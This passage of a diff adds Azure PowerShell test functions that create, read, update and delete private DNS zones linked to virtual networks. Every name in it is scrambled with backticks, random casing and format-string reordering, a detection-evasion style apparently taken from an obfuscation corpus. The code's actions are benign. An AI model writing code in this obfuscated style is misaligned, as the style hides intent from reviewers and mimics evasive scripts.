+	${creaTeDZ`o`NE} = &("{2}{1}{0}" -f'Zone','ew-AzDns','N') -Name ${zOnE`N`AMe} -ResourceGroupName ${R`eSO`U`R`cEgrOuP}."REsOU`Rce`GroUpNA`mE" -Tags @{("{1}{0}"-f 'ag1','t')=("{1}{0}" -f'alue1','v')} -ZoneType ("{1}{0}" -f'rivate','P') -RegistrationVirtualNetworkId @(${re`gVIRT`UALN`E`TwoRk}."ID")
+	&("{0}{1}{2}"-f'Assert-','NotN','ull') ${C`ReATeD`ZO`Ne}
+	&("{2}{3}{1}{4}{0}" -f 'l','t-NotNu','As','ser','l') ${CR`E`AtEdzoNE}."E`TAg"
+	&("{0}{1}{2}{3}" -f'As','sert-','Are','Equal') ${ZONeN`AMe} ${cR`eA`TedzonE}."nA`mE"
+	&("{0}{1}{2}"-f'As','sert-AreEqua','l') ${resOu`R`C`EgrO`UP}."r`esO`URc`EG`ROUPName" ${CREA`Te`D`ZoNe}."Res`Ou`Rce`gr`OupNaMe"
+	&("{0}{1}{2}{4}{3}" -f'A','s','sert','ual','-AreEq') 1 ${Cre`A`TedZo`NE}."t`AGs"."cO`UNt"
+	&("{1}{0}{3}{2}"-f 'ert-','Ass','qual','AreE') 1 ${CRE`AteD`zo`NE}."N`UM`BERoFRe`cOrDse`TS"
+	&("{0}{2}{1}{3}{4}"-f'Assert-','re','A','NotE','qual') ${c`REA`TED`zonE}."NUM`Ber`of`ReCORDs`EtS" ${CR`EATED`zONE}."MA`xN`Um`Be`ROFrEcO`R`DseTs"
+	&("{2}{0}{3}{1}" -f 'ssert-Ar','ual','A','eEq') ("{0}{2}{1}" -f'Pr','ate','iv') ${c`Rea`TED`zoNE}."Z`O`NeTYpE"
+	&("{1}{2}{3}{0}" -f'l','Asse','rt-A','reEqua') 1 ${Cre`At`Edz`ONE}."reGis`T`R`ATioNV`iRTU`A`LnETworkIdS"."COu`Nt"
+	&("{1}{2}{4}{0}{3}" -f 'Equ','Asser','t-A','al','re') ${reG`Vir`T`UalnetwOrk}."I`D" ${cREatE`D`ZOnE}."reGistR`A`TionvirtuA`l`NetworKI`Ds"[0]
+	&("{2}{3}{0}{1}" -f'-','AreEqual','A','ssert') 0 ${CRE`ATe`Dz`one}."resoLUTio`NviRT`UAl`NET`w`OrKIDS"."COU`NT"
+
+	${r`ETriEv`EDZONe} = &("{0}{2}{1}{4}{3}"-f 'G','A','et-','sZone','zDn') -Name ${z`onE`Name} -ResourceGroupName ${ReSOU`RCegr`Oup}."rES`OURCeg`ROUpN`AME"
+	&("{0}{2}{1}" -f 'Assert-','l','NotNul') ${rET`RieV`e`dZo`NE}
+	&("{3}{1}{2}{0}" -f 'l','ert-Not','Nul','Ass') ${rET`Rie`VE`Dzo`NE}."ET`AG"
+	&("{0}{1}{2}" -f 'As','se','rt-AreEqual') ${zO`N`enaMe} ${ReTr`ieVe`DZOnE}."N`AMe"
+	&("{3}{0}{1}{2}{4}"-f'ssert-','Ar','eE','A','qual') ${re`SOU`RCE`g`RoUp}."Res`OuR`CEgrOUpN`A`me" ${ReT`R`Ie`Vedz`one}."Res`oU`RCE`g`ROUPnAme"
+	&("{0}{1}{2}" -f'A','sse','rt-AreEqual') ${RE`Tr`IEvE`DzOnE}."E`Tag" ${CR`eaTE`D`ZoNe}."Et`AG"
+	&("{2}{4}{1}{3}{0}"-f 'al','Are','Asse','Equ','rt-') 1 ${RETr`I`eVeDZone}."Ta`Gs"."CO`Unt"
+	&("{1}{2}{0}"-f 'ual','Assert-A','reEq') ${CRE`AtEDz`One}."nUm`Bero`F`RecoRdSETs" ${rEtRi`eV`eD`zoNE}."nU`Mber`OfR`e`CoRdsEtS"
+	&("{1}{2}{3}{0}"-f'l','As','sert-AreEq','ua') ("{1}{0}" -f'te','Priva') ${re`T`RIE`VE`dZONe}."z`ONetyPE"
+	&("{0}{2}{1}" -f 'Assert-A','l','reEqua') ${cREA`TE`D`zoNe}."rEgI`STRAT`I`Onvi`R`TuALneTWoR`K`ids"."cO`Unt" ${RETRieVe`d`Z`oNE}."rEGI`St`R`ATIoNVI`RtUaln`EtWOR`KIds"."cO`UNT"
+	&("{2}{0}{1}{3}{4}"-f 'sert-','Ar','As','eEqu','al') ${cR`eAt`eDz`onE}."R`EGIsTraTI`ON`V`IRTuAl`N`etWOrkI`dS"[0] ${retr`i`eve`d`ZoNe}."rEGIStrA`TiON`V`irtUaL`NE`TworKIdS"[0]
+	&("{1}{0}{2}{3}"-f'r','Asse','t-AreE','qual') ${C`REa`TeDZoNe}."Re`SoL`U`T`I`oNVir`TU`AlnetwOrKIDS"."Cou`Nt" ${REt`R`I`E`VEDZONe}."resOluTIONv`I`R`TuaLnE`T`wOR`kiDs"."c`ouNT"
+	
+	
+
+	${U`PdaT`eDzONE} = &("{0}{2}{1}" -f'S','t-AzDnsZone','e') -Name ${ZoN`E`NaME} -ResourceGroupName ${ReS`oUr`ceG`RoUp}."reS`OU`R`CEG`ROup`NAMe" -Tags @{("{0}{1}" -f't','ag1')=("{1}{0}" -f'e1','valu');("{0}{1}" -f 't','ag2')=("{1}{0}{2}"-f 'alue','v','2')} -RegistrationVirtualNetworkId @()
+	&("{4}{0}{3}{2}{1}" -f't','l','ul','N','Assert-No') ${upDaTE`Dz`o`Ne}
+	&("{3}{2}{0}{4}{1}" -f'r','l','sse','A','t-NotNul') ${UPDat`ED`zO`Ne}."Et`AG"
+	&("{0}{3}{1}{4}{2}"-f 'Asse','-Ar','ual','rt','eEq') ${zo`NeNa`me} ${u`pdA`TE`dzoNE}."n`AME"
+	&("{0}{2}{3}{1}" -f 'A','l','ssert-A','reEqua') ${rE`soUrce`gRouP}."RESO`Urc`egrou`pn`AME" ${UPd`ATE`d`ZoNe}."RE`SOU`RCegrOUP`NamE"
+	&("{3}{1}{4}{0}{2}" -f 'eN','-','otEqual','Assert','Ar') ${uP`DA`TEDZo`Ne}."ET`AG" ${C`R`e`ATEDZonE}."E`TAg"
+	&("{2}{0}{1}{3}"-f'AreE','q','Assert-','ual') 2 ${u`PdA`TEdZOnE}."T`Ags"."COu`Nt"
+	&("{1}{0}{2}" -f 'a','Assert-AreEqu','l') ("{2}{0}{1}" -f'ivat','e','Pr') ${UpdAt`eDZO`Ne}."zOn`ET`YpE"
+	&("{3}{2}{1}{0}{4}" -f 'reEq','-A','ssert','A','ual') 0 ${UpD`AT`E`dZONE}."R`EGIStrAtIONvi`RtUal`N`etWOrK`ids"."Co`Unt"
+	&("{4}{1}{3}{2}{0}"-f'eEqual','-','r','A','Assert') 0 ${uPda`TedZ`o`Ne}."resOLUTioN`V`i`Rt`Ua`lNET`worKIds"."c`OuNT"
+
+	${uPda`TE`dZO`Ne}."R`EgI`S`T`Ra`Ti`OnvIR`TUAlN`eTwORkIDs" = @(${rEGVi`R`Tu`Alnet`WoRK}."ID")
+	${UPdA`Ted`zOnE} = ${uPd`ATe`dzo`Ne} | &("{1}{2}{0}" -f'ne','Set-A','zDnsZo')
+	&("{0}{1}{2}{3}" -f'Ass','ert-NotN','ul','l') ${up`D`AtEdZ`oNE}
+	&("{1}{0}{3}{2}" -f'ssert-No','A','ll','tNu') ${Upd`ATe`d`zOnE}."e`TAg"
+	&("{3}{2}{4}{0}{1}" -f '-','AreEqual','s','A','sert') ${Z`OnENA`me} ${Up`dAT`ed`ZONe}."NA`ME"
+	&("{0}{1}{2}" -f'Assert-A','r','eEqual') ${R`eSO`URCEgroUP}."RESOur`CeG`R`OUP`NamE" ${UpdaTE`DzO`Ne}."R`ESourc`E`Gr`OuPnAme"
+	&("{3}{0}{1}{2}"-f'er','t-AreNotEqua','l','Ass') ${U`pDa`TeDzoNE}."e`TAg" ${C`R`eATEDZoNE}."Et`Ag"
+	&("{3}{0}{1}{2}" -f'rt','-A','reEqual','Asse') 2 ${up`dated`ZoNE}."T`Ags"."COU`Nt"
+	&("{2}{1}{0}{3}"-f 'e','rt-Ar','Asse','Equal') ("{1}{0}{2}" -f 'a','Priv','te') ${uPdate`D`zo`NE}."Z`ON`eTypE"
+	&("{0}{2}{1}"-f'A','ert-AreEqual','ss') 1 ${uPdat`e`dzo`NE}."rEG`iSTrAtIONVI`R`T`U`A`lNetwOrkIDs"."COu`Nt"
+	&("{1}{4}{3}{2}{0}" -f 'ual','Asse','q','E','rt-Are') ${REGVirT`Ua`l`NeTWO`Rk}."Id" ${uP`dATe`Dzo`NE}."rEgI`ST`Ra`TiONvI`RtuAlNetWork`Ids"[0]
+	&("{2}{3}{1}{0}"-f 'qual','eE','Assert-','Ar') 0 ${U`PDa`TedZone}."r`ESol`Ut`ioNVi`RT`Ual`NETW`ORkidS"."CO`UNT"
+
+	${rE`TrIEv`e`DzOne} = &("{0}{3}{1}{2}" -f'G','-AzDns','Zone','et') -Name ${Zo`Ne`Name} -ResourceGroupName ${ReSOUrC`Egr`O`UP}."RE`SourceG`RoUpN`A`Me"
+	&("{2}{3}{1}{0}"-f'l','t-NotNul','As','ser') ${RETrie`VE`D`ZonE}
+	&("{3}{0}{2}{1}" -f'ser','tNull','t-No','As') ${rEtR`ie`Ve`DzoNE}."e`TAg"
+	&("{2}{0}{3}{1}"-f'rt-AreE','al','Asse','qu') ${ZoNE`N`Ame} ${rETRievEdz`o`Ne}."Na`mE"
+	&("{2}{0}{1}" -f 'sert-AreE','qual','As') ${reSo`U`RcE`gRo`Up}."RESOUrcE`gR`oupn`AME" ${R`E`TRiEv`EDZoNe}."Reso`Urcegro`U`pNAmE"
+	&("{4}{1}{0}{3}{2}"-f '-','rt','reEqual','A','Asse') ${r`Etr`I`e`VEDZone}."E`TAg" ${UP`d`ATeD`zone}."e`TAg"
+	&("{1}{0}{4}{2}{3}"-f 'ssert','A','Eq','ual','-Are') 2 ${rETRIe`Ved`z`OnE}."T`Ags"."CO`UNT"
+	&("{0}{3}{1}{2}"-f'As','t-AreE','qual','ser') ("{2}{1}{0}"-f 'e','t','Priva') ${rET`Ri`e`VedzOne}."ZON`e`TYPe"
+	&("{0}{1}{2}{3}" -f 'As','se','rt-AreEqu','al') ${upd`A`TeDZo`Ne}."r`e`G`iStRatiOnviR`TuAlN`eTWorKIDs"."cOU`Nt" ${RET`RieVE`DZO`NE}."rEGIs`TrA`Ti`On`ViR`TUa`Ln`E`TwOrkIdS"."Co`UNt"
+	&("{3}{1}{2}{0}" -f't-AreEqual','e','r','Ass') ${U`pd`AtedZonE}."REgiSt`RA`TIO`NVir`Tua`lN`eTwOR`K`IDS"[0] ${Re`Tri`eVED`z`OnE}."reGI`St`RAT`iOn`V`I`R`TuAlneTWOrki`Ds"[0]
+	&("{2}{1}{3}{0}"-f'al','se','As','rt-AreEqu') ${uPDaTE`d`zo`Ne}."re`S`olution`V`iRtUaLNETW`OrK`iDS"."cO`UNT" ${r`ETr`iE`VeDZoNe}."r`EsOL`UTIOnvIRtu`A`l`Net`WO`Rk`iDs"."C`OUNT"
+
+	${ReMo`V`ED} = &("{2}{3}{0}{1}"-f'e-AzDnsZ','one','Remo','v') -Name ${z`ONE`NAMe} -ResourceGroupName ${Re`sourC`EGr`oup}."resOURC`E`grou`PnAmE" -PassThru -Confirm:${f`Al`se}
+
+	&("{1}{2}{0}{3}" -f '-Tru','Ass','ert','e') { ${R`emoV`ED} }
+
+	&("{3}{1}{2}{0}"-f 'ws','rt-Th','ro','Asse') { &("{3}{0}{1}{2}"-f'n','sZon','e','Get-AzD') -Name ${zoNe`Na`ME} -ResourceGroupName ${rESo`Ur`c`EgrOUP}."reSO`Urc`E`GRo`U`pNaME" }
+	&("{0}{1}{2}{4}{3}"-f 'Remove','-AzRe','sourceGro','p','u') -Name ${r`e`SOUrC`egrOup}."rESO`URCeGR`O`UPNA`me" -Force
+}
+
+
+function tE`St-prIvA`TeZoN`E`cRUDRE`S`olUTION`VNEt
+{
+	${zOnE`N`AME} = &("{1}{0}{2}{5}{4}{3}"-f'o','Get-Rand','mZ','ame','neN','o')
+    ${ReSouRCE`gR`O`UP} = &("{2}{3}{0}{1}{4}{6}{5}" -f 't','up','TestS','e','-Cre','Group','ateResource')
+	${r`ESViRt`UaLnEt`wO`Rk} = &("{3}{0}{1}{2}{4}{5}" -f 'reateVi','rt','ualN','TestSetup-C','etwor','k') ${R`e`sOuRceGRO`UP}
+
+	${c`ReA`Ted`zonE} = &("{2}{1}{3}{0}"-f'e','w-AzD','Ne','nsZon') -Name ${z`onENa`ME} -ResourceGroupName ${R`ESOU`Rce`GroUP}."RE`sO`UrCeG`R`OU`Pname" -Tags @{("{0}{1}" -f'tag','1')=("{0}{1}" -f 'valu','e1')} -ZoneType ("{2}{1}{0}" -f'e','ivat','Pr') -ResolutionVirtualNetworkId @(${rE`S`VI`RtUALnEtw`O`RK}."Id")
+	&("{2}{1}{0}"-f 'll','-NotNu','Assert') ${crEaT`ed`ZOne}
+	&("{3}{0}{1}{2}{4}"-f 'se','rt-Not','N','As','ull') ${cR`Eat`EDZ`one}."Et`AG"
+	&("{3}{2}{0}{1}"-f 't','-AreEqual','ser','As') ${ZON`eNA`mE} ${cREA`Te`D`zONe}."N`AME"
+	&("{3}{0}{1}{2}"-f'q','u','al','Assert-AreE') ${r`ESOU`RcEGR`OUP}."Re`SOuRCE`G`R`oUpNa`me" ${cre`Ate`D`ZOne}."R`eS`oURC`EGRouPn`AmE"
+	&("{0}{2}{3}{1}{4}"-f 'As','AreEq','ser','t-','ual') 1 ${cRe`A`TedZ`ONe}."Ta`gs"."c`ouNT"
+	&("{2}{1}{3}{4}{0}" -f'ual','ser','As','t','-AreEq') 1 ${crEAt`E`D`ZONE}."n`UM`BE`R`O`FrecorDsETS"
+	&("{2}{3}{0}{1}" -f 'AreNot','Equal','Ass','ert-') ${crEaT`ED`zO`NE}."NU`Mb`erOF`Re`coRdsetS" ${cR`ea`TEd`zonE}."MAXnuMB`eR`O`FrEco`RD`SEts"
+	&("{1}{2}{4}{0}{3}"-f'qu','As','ser','al','t-AreE') ("{1}{2}{0}" -f'ivate','P','r') ${c`RE`AtE`dzONe}."zoN`EtY`pE"
+	&("{4}{3}{0}{1}{2}" -f 'eEq','u','al','r','Assert-A') 0 ${C`REAt`edzOne}."re`giS`TraTIOnv`iRTUALNeT`wOrkids"."co`UnT"
+	&("{1}{0}{4}{2}{3}"-f 'sert-A','As','eEqua','l','r') 1 ${c`REA`T`EdZone}."rE`solU`TI`onVIr`Tu`Alne`TwoR`KiDs"."C`oUNT"
+	&("{2}{1}{0}{3}"-f'E','sert-Are','As','qual') ${rEsV`irt`U`ALnETWOrK}."i`d" ${cr`E`ATeD`zOne}."RESo`lU`TIonvir`T`U`ALnet`Workids"[0]
+
+	${RE`TR`IeVEDz`O`Ne} = &("{2}{0}{3}{1}" -f 'et','e','G','-AzDnsZon') -Name ${zO`Ne`NA`Me} -ResourceGroupName ${Res`oU`RCE`g`RoUP}."R`E`sour`CeGrouP`Name"
+	&("{3}{0}{1}{2}" -f 'se','rt-NotN','ull','As') ${re`TrIe`VeDzo`NE}
+	&("{2}{0}{1}"-f 'ert-NotN','ull','Ass') ${R`e`T`Ri`eVedZONE}."eT`AG"
+	&("{2}{0}{3}{1}{4}" -f's','rt-AreEqu','A','se','al') ${Zo`N`ENaMe} ${ReTrie`VEdZ`One}."N`AMe"
+	&("{1}{3}{0}{4}{2}"-f'Ar','Assert','qual','-','eE') ${REsOu`RCe`g`RO`UP}."ReSourC`EGr`oU`PNa`mE" ${r`E`TRIEvedZoNE}."Re`sOurcegr`OUpN`AMe"
+	&("{2}{3}{1}{4}{0}" -f'al','AreE','Asse','rt-','qu') ${RE`TRie`VEDz`ONe}."E`TAG" ${C`Re`AtEdZOnE}."Et`Ag"
+	&("{4}{3}{2}{1}{0}" -f 'qual','eE','r','-A','Assert') 1 ${RET`RiEVE`dz`OnE}."t`AGS"."cO`UNt"
+	&("{2}{4}{3}{0}{1}" -f'-A','reEqual','As','rt','se') ${crEaTe`d`ZO`NE}."NUmb`ERoF`REcor`DS`e`Ts" ${Retr`ievEDz`o`NE}."n`UmBEro`F`RECO`RDSetS"
+	&("{1}{3}{0}{2}" -f'rt-AreE','As','qual','se') ("{2}{1}{0}" -f'te','riva','P') ${ReT`RieVe`DZONE}."ZONE`TYPe"
+	&("{1}{2}{0}"-f'l','Assert-A','reEqua') ${Cr`ea`TeDZONE}."ReGiStR`A`Tio`NvIRtUal`Netwo`Rk`ids"."Co`UnT" ${reTr`iEv`ed`zo`NE}."rE`G`ISTRAtIo`N`ViRtUAlN`eTWor`KIds"."coU`NT"
+	&("{4}{0}{3}{1}{2}"-f'er','re','Equal','t-A','Ass') ${cR`eatEdz`onE}."reSo`luTioNviR`TUA`lnETwo`RkiDs"."Co`UNT" ${R`et`Rieve`dZONe}."re`sOlutioN`VIRtuA`lN`EtwO`RkIdS"."CO`UnT"
+	&("{1}{3}{0}{2}"-f 'q','Assert-Are','ual','E') ${cre`Ate`Dzone}."r`EsoL`UTI`ONVi`Rt`UaL`N`etWORkids"[0] ${reT`RieV`eDZO`NE}."ResOL`UtIO`N`V`iRtualN`Etwo`R`KIDS"[0]
+	
+	
+
+	${upd`A`TEdz`ONE} = &("{1}{0}{2}{3}" -f 't-AzDns','Se','Zo','ne') -Name ${Z`oN`enamE} -ResourceGroupName ${re`SOuR`ceg`Roup}."Res`O`U`RCeGroupna`Me" -Tags @{("{0}{1}" -f'tag','1')=("{0}{1}" -f 'va','lue1');("{1}{0}" -f'g2','ta')=("{1}{0}" -f'ue2','val')} -ResolutionVirtualNetworkId @()
+	&("{2}{0}{1}"-f 'rt-NotNul','l','Asse') ${uPDa`T`EdZo`NE}
+	&("{1}{0}{2}{3}" -f 't-No','Asser','tNu','ll') ${u`p`dAtEDZo`Ne}."ET`AG"
+	&("{4}{1}{2}{0}{3}" -f 'E','ssert-','Are','qual','A') ${zONe`N`A`me} ${U`pdA`TEdzo`NE}."N`Ame"
+	&("{0}{2}{3}{1}" -f'Asse','ual','rt','-AreEq') ${rES`OUrC`EGROup}."ResoUr`CEG`R`ouP`NAME" ${up`d`AtEdZ`onE}."rE`soURcEG`Ro`Up`NAmE"
+	&("{1}{3}{5}{4}{2}{0}"-f 'al','A','reNotEqu','ss','rt-A','e') ${UpdAtEd`zO`Ne}."et`Ag" ${CREAT`ED`ZoNe}."E`Tag"
+	&("{0}{3}{4}{2}{1}"-f 'Ass','al','qu','e','rt-AreE') 2 ${Up`dA`Te`dzoNe}."ta`gS"."cO`UNt"
+	&("{3}{2}{1}{0}"-f'Equal','re','sert-A','As') ("{2}{1}{0}" -f'e','ivat','Pr') ${UpdAtE`Dzo`Ne}."z`On`eTyPe"
+	&("{1}{0}{2}"-f 'A','Assert-','reEqual') 0 ${updaTe`d`Zone}."regISTraTIoN`VIR`T`U`AlNe`T`wo`RkIds"."C`oUnT"
+	&("{4}{0}{1}{2}{3}"-f 'ser','t-A','re','Equal','As') 0 ${UP`datED`ZoNE}."reS`Ol`Ut`Io`NVir`TuaLnetw`oRkIds"."CO`UNt"
+
+	${UPDA`TEdZo`NE}."RESOL`U`TI`ONvIRt`UALN`eTwOrkIDS" = @(${R`e`svIR`TUa`LneTwORK}."iD")
+	${UP`DAtED`zone} = ${uP`DA`TeDz`onE} | &("{2}{0}{1}"-f'Dn','sZone','Set-Az')
+	&("{1}{3}{0}{2}" -f 'NotNu','Asse','ll','rt-') ${UPd`AteDZO`Ne}
+	&("{0}{1}{2}"-f 'Assert-','NotNul','l') ${u`pDAT`edzo`NE}."E`TAG"
+	&("{2}{1}{3}{0}"-f'l','rt-Are','Asse','Equa') ${zONe`Na`mE} ${UpD`AtedZ`O`Ne}."n`AME"
+	&("{3}{1}{0}{2}{4}"-f 'u','rt-AreEq','a','Asse','l') ${r`ESOUrceG`R`Oup}."re`sOu`RCEGR`o`Upname" ${upDAT`e`d`zoNE}."reSou`RCegR`ouPn`A`me"
+	&("{1}{2}{0}{4}{3}" -f't-Ar','A','sser','tEqual','eNo') ${U`PDATEdZo`Ne}."eT`AG" ${crEat`edz`O`NE}."Et`AG"
+	&("{4}{3}{0}{2}{1}" -f 'sert-','ual','AreEq','s','A') 2 ${U`pDa`TE`dZOnE}."Ta`gS"."COU`NT"
+	&("{1}{2}{4}{3}{0}" -f 'l','As','sert','ua','-AreEq') ("{0}{1}" -f'Pri','vate') ${UpDaT`ed`ZOnE}."Z`O`NeTyPE"
+	&("{2}{1}{0}{4}{3}"-f 't-AreE','er','Ass','l','qua') 0 ${UP`dAtE`Dzo`Ne}."regISTra`T`i`OnV`iRtu`AL`NETW`O`RkIDS"."C`OUNT"
+	&("{1}{3}{0}{2}" -f 'q','Assert','ual','-AreE') 1 ${Up`DA`TedZ`OnE}."r`eSOlutI`oNVirtu`AlN`E`TwoRKidS"."cOU`NT"
+	&("{2}{1}{3}{0}" -f 't-AreEqual','ss','A','er') ${RESViRT`Ua`L`N`ETwoRk}."iD" ${UpDa`TE`D`zONE}."R`Es`oL`UTi`OnVI`RtUalNeTwo`RkI`Ds"[0]
+
+	${reTrIe`V`e`Dz`oNE} = &("{0}{3}{1}{2}"-f'Ge','nsZon','e','t-AzD') -Name ${Z`ONEN`AMe} -ResourceGroupName ${r`eSOUrcegr`O`UP}."Re`S`OuRCeGrou`PnAme"
+	&("{3}{2}{1}{0}"-f'Null','-Not','rt','Asse') ${R`et`RievedzOnE}
+	&("{3}{1}{0}{2}" -f 't-Not','ser','Null','As') ${reT`Ri`eV`e`DzOne}."Et`AG"
+	&("{2}{1}{0}{3}" -f 't-','r','Asse','AreEqual') ${Zon`EN`AmE} ${RETR`IeveDzo`Ne}."NA`ME"
+	&("{1}{3}{0}{2}{4}" -f 'rt-Are','Ass','E','e','qual') ${ReSo`URC`eg`R`oUp}."REsOur`c`EGR`oUp`NaME" ${rETRIeVEd`Z`ONe}."rE`sou`RceGrO`UPn`AMe"
+	&("{3}{0}{2}{1}" -f '-A','qual','reE','Assert') ${RE`TRIe`V`EDZ`oNE}."e`TAG" ${UpDA`T`EDzoNE}."ET`AG"
+	&("{0}{3}{1}{2}"-f'A','sert-Are','Equal','s') 2 ${ReT`R`iEvEDzo`NE}."tA`gS"."c`OuNT"
+	&("{0}{2}{3}{1}"-f'A','t-AreEqual','ss','er') ("{2}{1}{0}" -f 'te','a','Priv') ${RE`TrIevE`D`Z`ONE}."Z`ONety`Pe"
+	&("{3}{2}{1}{0}" -f'ual','reEq','rt-A','Asse') ${u`pDateD`Z`ONe}."Reg`Ist`RatiO`NviRt`UalNetWoR`Ki`DS"."COU`Nt" ${Re`T`RIEV`EDz`oNe}."re`g`IsTr`ATI`o`N`VirTuAL`NetWoRK`Ids"."co`UNT"
+	&("{0}{1}{2}"-f'Assert-','Are','Equal') ${U`Pd`AT`edZoNe}."r`es`OLUtiON`ViRtu`Al`NETWOrKIdS"."C`OUNt" ${re`Tri`evEDZONe}."r`ESOlutIo`NvIR`T`Ua`l`NEt`Work`IdS"."cO`UNt"
+	&("{2}{1}{4}{3}{0}" -f'l','t','Asser','reEqua','-A') ${up`DATeDZ`oNe}."RES`Ol`UTIOn`VIrtual`NEtWo`Rk`idS"[0] ${rEtR`I`eV`EDzO`NE}."RES`O`L`UtIOnvi`RtuALNetwo`RKIdS"[0]
+
+	${R`EmOvED} = &("{1}{0}{2}{3}"-f'emove','R','-AzDns','Zone') -Name ${ZonEn`A`me} -ResourceGroupName ${r`EsO`UrceG`RoUP}."rESO`UR`CEg`RouP`NAME" -PassThru -Confirm:${f`AlSE}
+
+	&("{0}{2}{1}" -f 'As','e','sert-Tru') { ${rE`movEd} }
+
+	&("{2}{1}{0}{3}" -f'hro','ssert-T','A','ws') { &("{1}{2}{0}" -f'e','Get-AzD','nsZon') -Name ${zO`NENa`me} -ResourceGroupName ${REs`oURcegR`O`Up}."RE`SouRcEGR`o`U`PnAME" }
+	&("{5}{0}{1}{6}{2}{4}{3}" -f 'mov','e-AzR','ou','Group','rce','Re','es') -Name ${rE`So`Ur`C`egRoUP}."rESOurc`egR`ouPN`AME" -Force
+}
+
+
+function t`esT`-privaT`eZ`ONeCRuDBYVi`RT`Ua`ln`E`TWOrKIDs
+{
+	${Z`onEna`me} = &("{0}{2}{3}{1}"-f 'Get-R','me','andomZone','Na')
+    ${REsOU`R`cEGrOUP} = &("{1}{5}{3}{0}{2}{4}"-f'esou','TestSetup-Cr','rc','eR','eGroup','eat')
+	${rEGv`ir`TUALN`ET`W`OrK} = &("{1}{4}{2}{0}{6}{5}{3}"-f 't','Test','ea','alNetwork','Setup-Cr','rtu','eVi') ${RES`ourCE`g`ROUp}
+	${rESV`IRT`Ual`NE`T`WoRk} = &("{5}{1}{7}{0}{2}{4}{6}{3}" -f '-Create','stSet','VirtualN','work','e','Te','t','up') ${R`EsOu`R`c`eGrOuP}
+
+	${cRe`A`Te`DzONE} = &("{0}{1}{2}"-f'New-','AzDnsZo','ne') -Name ${zO`NeN`Ame} -ResourceGroupName ${reSo`U`Rc`eGROuP}."REs`O`UrCEg`RoUPNa`Me" -Tags @{("{0}{1}" -f'ta','g1')=("{0}{1}{2}"-f'v','a','lue1')} -ZoneType ("{0}{1}"-f 'Priv','ate') -RegistrationVirtualNetworkId @(${rE`gvirTu`AL`NetW`ork}."i`D") -ResolutionVirtualNetworkId @(${r`esvirt`U`ALN`ETWo`Rk}."ID")
+	&("{3}{2}{1}{4}{0}" -f'll','-No','ert','Ass','tNu') ${c`ReaT`EdzO`Ne}
+	&("{1}{3}{2}{0}" -f't-NotNull','As','er','s') ${cREa`T`Edzone}."E`TAG"
+	&("{3}{4}{0}{2}{1}"-f'er','eEqual','t-Ar','As','s') ${Zo`N`e`Name} ${CrEAT`edzo`NE}."N`AMe"
+	&("{3}{0}{4}{2}{1}" -f'rt-','l','eEqua','Asse','Ar') ${rEso`U`RCEgRO`Up}."rES`O`URCEgROu`Pn`AmE" ${c`R`E`ATedzone}."R`Es`O`URC`eGROUP`NAme"
+	&("{1}{2}{0}{3}"-f're','Ass','ert-A','Equal') 1 ${c`REATED`zONe}."tA`Gs"."Co`UnT"
+	&("{0}{2}{1}"-f'As','ual','sert-AreEq') 1 ${cReA`TEd`Zo`NE}."numB`ERoFReco`RD`sEtS"
+	&("{0}{2}{1}{3}" -f'A','ert-','ss','AreNotEqual') ${C`REATeD`zOne}."nUMbeRo`FrE`coRDS`eTS" ${c`ReA`TED`zONe}."Ma`Xn`Um`BeR`OFreCoR`DSeTS"
+	&("{3}{1}{0}{2}" -f 't-AreEqu','ser','al','As') ("{1}{0}{2}" -f 'a','Priv','te') ${CRE`A`TEdZO`Ne}."ZonE`TYpe"
+	&("{3}{2}{0}{4}{1}" -f 'eEq','l','ssert-Ar','A','ua') 1 ${cRe`ATED`z`onE}."rE`gI`st`RaTIonv`iRTUa`lNeTWOR`Kids"."CoU`Nt"
+	&("{0}{2}{1}"-f 'Ass','al','ert-AreEqu') ${R`e`g`V`IRt`UALNetWork}."id" ${CreA`TEDz`oNE}."REGistr`AtIonv`IRtUA`lNetW`or`kIDS"[0]
+	&("{2}{0}{1}"-f 'ert-Are','Equal','Ass') 1 ${C`REA`TEdZonE}."reSo`luTIONvI`R`TUAl`N`etwOrkI`ds"."cOU`NT"
+	&("{4}{3}{0}{1}{2}" -f 's','ert-Are','Equal','s','A') ${r`e`SV`IrtUAlNeTWoRk}."I`D" ${C`R`e`AtedZonE}."resOL`UtI`oNV`i`R`Tualn`ET`wOR`kiDS"[0]
+
+	${UpdATed`Zo`Ne} = &("{1}{2}{0}" -f'e','Set','-AzDnsZon') -Name ${Zo`NEn`Ame} -ResourceGroupName ${RE`sOuRcEg`R`OuP}."r`EsoUr`CeGro`UPN`AMe" -Tags @{("{1}{0}"-f'g1','ta')=("{0}{1}" -f'value','1');("{0}{1}"-f'tag','2')=("{1}{0}{2}" -f 'l','va','ue2')} -RegistrationVirtualNetworkId @() -ResolutionVirtualNetworkId @()
+	&("{0}{3}{2}{1}"-f'As','t-NotNull','er','s') ${upD`ATE`D`ZONe}
+	&("{0}{2}{1}{3}" -f'A','No','ssert-','tNull') ${UPD`AT`edzOne}."E`TAg"
+	&("{3}{0}{2}{1}"-f't-Are','al','Equ','Asser') ${z`oN`EnAMe} ${Up`da`TEDzo`Ne}."N`Ame"
+	&("{2}{3}{4}{0}{1}" -f 'Equ','al','As','se','rt-Are') ${rEs`O`U`RceGrOuP}."re`souRc`EGro`UPNamE" ${UP`dAteD`zO`Ne}."ResoU`RcEG`RO`U`PNaME"
+	&("{2}{3}{1}{5}{0}{4}" -f'eNot','t-','A','sser','Equal','Ar') ${uPDatE`dZ`onE}."eT`Ag" ${CReatE`D`z`oNE}."eT`AG"
+	&("{2}{3}{1}{0}{4}"-f 'a','eEqu','Ass','ert-Ar','l') 2 ${U`P`d`AtEDZOne}."T`AgS"."c`OuNt"
+	&("{2}{1}{0}{3}" -f 'reEqua','ssert-A','A','l') ("{1}{2}{0}" -f'ate','Pri','v') ${uPDA`T`E`DZoNe}."zoNE`T`ypE"
+	&("{3}{2}{0}{1}{4}" -f'r','eEqu','A','Assert-','al') 0 ${UpD`ATedZ`o`NE}."REGiST`RATI`ON`V`ir`TUALn`eTw`OrkidS"."c`OUNT"
+	&("{2}{1}{3}{0}"-f'ual','ssert','A','-AreEq') 0 ${u`pd`ATE`dzOne}."rESol`UTIO`NvIRTuAL`NE`TWORkidS"."Cou`NT"
+
